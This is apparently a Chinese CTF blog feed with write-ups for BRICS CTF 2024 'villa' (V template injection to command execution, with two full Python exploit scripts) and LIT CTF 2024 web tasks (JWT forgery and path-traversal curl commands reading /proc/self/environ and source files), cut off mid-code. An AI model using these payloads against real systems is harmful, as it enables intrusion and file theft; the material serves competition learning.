    <content type="html"><![CDATA[<p>官方wp&gt;&gt;&gt;<a href="https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks">https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks</a></p><h1 id="villa"><a href="#villa" class="headerlink" title="villa"></a><font style="color:rgb(31, 35, 40);">villa</font></h1><p>v语言写的一个web程序</p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">module main<br><br>import os<br>import vweb<br><br>struct App &#123;<br>vweb.Context<br>&#125;<br><br>@[&#x27;/&#x27;; get; post]<br>fn (mut app App) index() vweb.Result &#123;<br>return $vweb.html()<br>&#125;<br><br>@[&#x27;/villa&#x27;; get; post]<br>fn (mut app App) villa() vweb.Result &#123;<br>if app.req.method == .post &#123;<br>os.write_file(&#x27;villa.html&#x27;, $tmpl(&#x27;template.html&#x27;)) or &#123; panic(err) &#125;<br>&#125;<br><br>return $vweb.html()<br>&#125;<br><br>fn main() &#123;<br>app := &amp;App&#123;&#125;<br>params := vweb.RunParams&#123;<br>port: 8080,<br>nr_workers: 1,<br>    &#125;<br><br>vweb.run_at(app, params) or &#123; panic(err) &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>/villa</code>路由将<code>$tmpl(&#39;template.html&#39;)</code>的返回值写入<code>villa.html</code></p><p><code>template.html</code>的<code>@app.req.data</code>接收用户传入的值，这是整个程序唯一的输入点</p><p>在docker的启动脚本里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp villa.html villa.html.bak<br><br>while true; do<br>    sleep 30<br>    cp villa.html.bak villa.html<br>done &amp;<br></code></pre></td></tr></table></figure><p>每30秒重置<code>villa.html</code></p><p>通过<code>$vweb.html()</code>渲染html</p><p>替换html时经过了<code>$tmpl</code>函数处理</p><p>查看该引擎的源码</p><p><a href="https://github.com/vlang/v/blob/715dc3116123b69abe25d14536cad18da6bd7ab6/vlib/v/parser/tmpl.v#L397">https://github.com/vlang/v/blob/715dc3116123b69abe25d14536cad18da6bd7ab6/vlib/v/parser/tmpl.v#L397</a><br>该引擎处理模板文件，将其转换为V语言代码</p><p>根据官方wp给出的片段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#125; else if line_t.starts_with(&#x27;.&#x27;) &amp;&amp; line.ends_with(&#x27;&#123;&#x27;) &#123;<br>    // `.header &#123;` =&gt; `&lt;div class=&#x27;header&#x27;&gt;`<br>    class := line.find_between(&#x27;.&#x27;, &#x27;&#123;&#x27;).trim_space()<br>    trimmed := line.trim_space()<br>    source.write_string(strings.repeat(`\t`, line.len - trimmed.len)) // add the necessary indent to keep &lt;div&gt;&lt;div&gt;&lt;div&gt; code clean<br>    source.writeln(&#x27;&lt;div class=&quot;$&#123;class&#125;&quot;&gt;&#x27;)<br>    continue<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/brics/1728404000635-dc9d6356-1f2d-486b-b5eb-a7a5a148da31.png"></p><p>该段代码会处理<code>.</code>开头<code>&#123;</code>结尾的行并截取两个符号之间的字符串作为<code>$&#123;class&#125;</code></p><p>看官方给出的payload</p><p>实际上是对<code>source.writeln(</code>进行闭合然后拼接shell命令，导致tmpl.v执行的同时执行shell命令导致rce</p><p>插入payload后如下</p><p><code>source.writeln(&#39;&lt;div class=&quot;&#39;); C.system(&#39;cat flag.*.txt &gt; villa.html&#39;.str); println(&#39;&quot;&gt;&#39;)</code></p><p>实际上执行了<code>source.writeln(&#39;&lt;div class=&quot;&#39;)``C.system(&#39;cat flag.*.txt &gt; villa.html&#39;.str)``println(&#39;&quot;&gt;&#39;)</code></p><p>官方exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>HOST = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;localhost&#x27;</span><br>PORT = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">17171</span><br><br>URL = <span class="hljs-string">f&#x27;http://ip:17171/villa&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        payload = <span class="hljs-string">&quot;\n. &#x27;); C.system(&#x27;cat flag.*.txt &gt; villa.html&#x27;.str); println(&#x27; &#123;\n&quot;</span><br>        requests.post(URL, data = payload)<br><br>        response = requests.get(URL)<br>        <span class="hljs-built_in">print</span>(response.content)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.content:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>    time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>要注意到的是这里前后加上换行是为了让payload单独一行，才能正确让<code>tmpl</code>截取到我们的payload</p><p><img src="/mdimg/brics/1728404419139-7690f3b1-708a-45da-a43e-75e31b66f470.png"></p><p>这里执行system命令要<code>C.system</code>但是<code>os.system</code>跑不通</p><p>于是又找到了一个文章 <a href="https://dreyand.rs/ctf/2024/10/06/vlang-template-injection-lazy-loading-iframes-ss-leaks-brics-ctf-quals">https://dreyand.rs/ctf/2024/10/06/vlang-template-injection-lazy-loading-iframes-ss-leaks-brics-ctf-quals</a></p><blockquote><p><font style="color:rgb(34, 34, 34);">* Side note: Someone in the discord also found a way to get full RCE, as shared by :</font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;кек&lt;/font&gt;</code></p><p><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;$&#123; C.system(&amp;char(“cat flag* &gt; /tmp/villa/villa.html”.str)) &#125;&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> . yes, you can use C in V ))</font></p><p><font style="color:rgb(34, 34, 34);">That’s an insane functionality provided by the language XD</font></p></blockquote><p>通过<code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;language XD&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);">可以在Vlang执行C语言</font></p><p><font style="color:rgb(34, 34, 34);">这篇文章提供了另外一个解法就是通过vweb的内置函数</font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;scan_static_directory&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);">来读取文件夹的文件列表。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">fn (mut ctx Context) scan_static_directory(directory_path string, mount_path string, host string) &#123;<br>    files := os.ls(directory_path) <span class="hljs-keyword">or</span> &#123; panic(err) &#125;<br>    <span class="hljs-keyword">if</span> files.<span class="hljs-built_in">len</span> &gt; <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files &#123;<br>            full_path := os.join_path(directory_path, file)<br>            <span class="hljs-keyword">if</span> os.is_dir(full_path) &#123;<br>                ctx.scan_static_directory(full_path, mount_path.trim_right(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&#x27;/&#x27;</span> + file,<br>                    host)<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> file.contains(<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; !file.starts_with(<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; !file.ends_with(<span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                ext := os.file_ext(file)<br>                // Rudimentary guard against adding files <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mime_types.<br>                // Use host_serve_static directly to add non-standard mime types.<br>                <span class="hljs-keyword">if</span> ext <span class="hljs-keyword">in</span> mime_types &#123;<br>                    ctx.host_serve_static(host, mount_path.trim_right(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&#x27;/&#x27;</span> + file,<br>                        full_path)<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(26, 32, 41);">这个函数不是公开的，需要找到另一个调用它的函数。</font></p><p><font style="color:rgb(26, 32, 41);">文章提供了3个</font></p><blockquote><p><font style="color:rgb(34, 34, 34);">All we have to do now is:</font></p><ul><li><font style="color:rgb(34, 34, 34);">use the</font><font style="color:rgb(34, 34, 34);"> </font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;host_mount_static_folder_at&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">gadget to</font><font style="color:rgb(34, 34, 34);"> </font><strong><font style="color:rgb(34, 34, 34);">mount</font></strong><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">the</font><font style="color:rgb(34, 34, 34);"> </font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;/tmp/villa&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">directory into a</font><font style="color:rgb(34, 34, 34);"> </font><strong><font style="color:rgb(34, 34, 34);">static</font></strong><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">one</font></li><li><font style="color:rgb(34, 34, 34);">read the server config via</font><font style="color:rgb(34, 34, 34);"> </font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;@app&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">to get a</font><font style="color:rgb(34, 34, 34);"> </font><strong><font style="color:rgb(34, 34, 34);">list of files</font></strong><font style="color:rgb(34, 34, 34);">, including the filename of the flag.</font></li><li><font style="color:rgb(34, 34, 34);">use the </font><strong><font style="color:rgb(34, 34, 34);">arb file read</font></strong><font style="color:rgb(34, 34, 34);"> gadget to get the flag</font></li></ul></blockquote><p><font style="color:rgb(34, 34, 34);">exp</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> httpx <br><span class="hljs-keyword">import</span> re <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mount_static</span>(<span class="hljs-params">client</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    @&#123;dump(app.handle_static(&#x27;/tmp/villa&#x27;, true))&#125;</span><br><span class="hljs-string">    @&#123;dump(app.host_handle_static(&#x27;localhost&#x27;, &#x27;/tmp/villa&#x27;, true))&#125;</span><br><span class="hljs-string">    @&#123;dump(app.mount_static_folder_at(&#x27;/tmp/villa&#x27;, &#x27;/leak&#x27;))&#125;</span><br><span class="hljs-string">    @app</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <br>    resp = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-string">&quot;true&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp:<br>        <span class="hljs-keyword">try</span>:<br>            resp = client.post(<span class="hljs-string">&quot;/villa&quot;</span>, data=payload).text<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span> <span class="hljs-comment"># server timeout</span><br>    <br>    flag_pattern = <span class="hljs-string">r&#x27;/tmp/villa/flag\.[a-f0-9]&#123;32&#125;\.txt&#x27;</span><br>    flag_loc = re.findall(flag_pattern, resp)<br>    <br>    <span class="hljs-keyword">return</span> flag_loc[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readflag</span>(<span class="hljs-params">client, flag_loc</span>):<br>    payload = <span class="hljs-string">&quot;@&#123;app.file(&#x27;%s&#x27;)&#125;&quot;</span> % (flag_loc)<br>    <br>    resp = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            resp = client.post(<span class="hljs-string">&quot;/villa&quot;</span>, data=payload).text<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> resp <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;brics&quot;</span> <span class="hljs-keyword">in</span> resp:<br>                <span class="hljs-built_in">print</span>(resp)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span> <span class="hljs-comment"># server timeout</span><br>    <br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    BASE_URL = <span class="hljs-string">&quot;http://TARGET-URL&quot;</span><br>    client = httpx.Client(base_url=BASE_URL)<br>    <br>    flag_loc = mount_static(client)<br>    readflag(client, flag_loc)<br>    <br>     <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LIT CTF 2024 web</title>
    <link href="/2024/08/13/LIT%20CTF%202024%20web/"/>
    <url>/2024/08/13/LIT%20CTF%202024%20web/</url>
    
    <content type="html"><![CDATA[<h3 id="anti-inspect"><a href="#anti-inspect" class="headerlink" title="anti-inspect"></a>anti-inspect</h3><p>Curl访问得到</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const <span class="hljs-built_in">flag</span> = <span class="hljs-string">&quot;LITCTF&#123;your_%cfOund_teh_fI@g_94932&#125;&quot;</span>;<br>      <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>        console.<span class="hljs-built_in">log</span>(<br>          <span class="hljs-built_in">flag</span>,<br>          <span class="hljs-string">&quot;background-color: darkblue; color: white; font-style: italic; border: 5px solid hotpink; font-size: 2em;&quot;</span><br>        );<br><br></code></pre></td></tr></table></figure><p><code>LITCTF&#123;your_fOund_teh_fI@g_94932&#125;</code></p><h3 id="jwt-1"><a href="#jwt-1" class="headerlink" title="jwt-1"></a>jwt-1</h3><p>没key的jwt<br>抓登录的包<br><img src="/mdimg/litctf2024/1723554526255-60565e0c-71c7-4c84-8a0a-97495ab030ba.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: litctf.org:<span class="hljs-number">31781</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Origin</span>: http://litctf.org:<span class="hljs-number">31781</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">101</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4951</span>.<span class="hljs-number">41</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://litctf.org:<span class="hljs-number">31781</span>/login/<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTE0NTE0MTk4MTkiLCJhZG1pbiI6dHJ1ZX0.orvLsIOWCHK7lreLD-<span class="hljs-number">3</span>EQXyjnppymPnpAp16bw-okV4<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure><p><code>LITCTF&#123;o0ps_forg0r_To_v3rify_1re4DV9&#125;</code></p><h3 id="jwt-2"><a href="#jwt-2" class="headerlink" title="jwt-2"></a>jwt-2</h3><p>js生成的jwt<br>附件直接给了key<br><code>const jwtSecret = &quot;xook&quot;;</code><br>复用附件源码来生成jwt</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-comment">// JWT 密钥</span><br><span class="hljs-keyword">const</span> jwtSecret = <span class="hljs-string">&quot;xook&quot;</span>;<br><br><span class="hljs-comment">// JWT 头部</span><br><span class="hljs-keyword">const</span> jwtHeader = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<br>  <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">alg</span>: <span class="hljs-string">&quot;HS256&quot;</span>, <span class="hljs-attr">typ</span>: <span class="hljs-string">&quot;JWT&quot;</span> &#125;),<br>  <span class="hljs-string">&quot;utf-8&quot;</span><br>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;base64&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/=/g</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-comment">// 生成 JWT 的函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">sign</span> = (<span class="hljs-params">payload</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> jwtPayload = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    .<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;base64&quot;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/=/g</span>, <span class="hljs-string">&quot;&quot;</span>);<br>  <span class="hljs-keyword">const</span> signature = crypto.<span class="hljs-title function_">createHmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, jwtSecret)<br>    .<span class="hljs-title function_">update</span>(jwtHeader + <span class="hljs-string">&#x27;.&#x27;</span> + jwtPayload)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;base64&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/=/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">return</span> jwtHeader + <span class="hljs-string">&quot;.&quot;</span> + jwtPayload + <span class="hljs-string">&quot;.&quot;</span> + signature;<br>&#125;;<br><br><span class="hljs-comment">// 示例用户信息</span><br><span class="hljs-keyword">const</span> user = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;114514&quot;</span>, <span class="hljs-comment">// 用户名</span><br>  <span class="hljs-attr">admin</span>: <span class="hljs-literal">true</span>  <br>&#125;;<br><br><span class="hljs-comment">// 使用 sign 函数生成 JWT</span><br><span class="hljs-keyword">const</span> token = <span class="hljs-title function_">sign</span>(user);<br><br><span class="hljs-comment">// 输出生成的 JWT 令牌</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Generated JWT:&quot;</span>, token);<br></code></pre></td></tr></table></figure><p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTE0NTE0IiwiYWRtaW4iOnRydWV9.Fc+hyMRa6S2iv4pYtZTEhQ4guMBiKo8veEulUNbBI8U</code><br><img src="/mdimg/litctf2024/1723554666503-bff5d1a7-ae0e-4137-8e84-5a0e1cfef2eb.png"></p><h3 id="traversed"><a href="#traversed" class="headerlink" title="traversed"></a>traversed</h3><p>dirsearch发现存在目录遍历</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://litctf.org:<span class="hljs-number">31778</span>/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/proc/self/environ --output -<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">NODE_VERSION</span>=<span class="hljs-number">16.20</span>.2HOSTNAME=faddb7f3a9c2YARN_VERSION=<span class="hljs-number">1.22</span>.19BUN_INSTALL=<span class="hljs-regexp">/root/</span>.bunHOME=<span class="hljs-regexp">/rootPATH=/root</span><span class="hljs-regexp">/.bun/bin</span><span class="hljs-symbol">:/usr/local/sbin</span><span class="hljs-symbol">:/usr/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/binPWD=/app</span><br></code></pre></td></tr></table></figure><p>查看cmdline</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://litctf.org:<span class="hljs-number">31778</span>/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/proc/self/cmdline --output -<br></code></pre></td></tr></table></figure><p>发现源码文件是index.ts<br>结合environ得到网站目录是/app</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://litctf.org:<span class="hljs-number">31778</span>/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/app/index.ts --output -<br></code></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> http <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;http&quot;</span>;<br><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:fs/promises&quot;</span>;<br><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:path&quot;</span>;<br><span class="hljs-keyword">import</span> url <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:url&quot;</span>;<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-comment">// Parse the raw URL to get the path</span><br>  <span class="hljs-keyword">const</span> rawPath = <span class="hljs-built_in">decodeURIComponent</span>(req.<span class="hljs-property">url</span>!);<br><br>  <span class="hljs-comment">// Resolve the absolute path, allowing for parent directory access</span><br>  <span class="hljs-keyword">const</span> absPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;site&quot;</span>, rawPath);<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> file = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(absPath, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/plain&quot;</span> &#125;);<br>    res.<span class="hljs-title function_">end</span>(file);<br>  &#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span 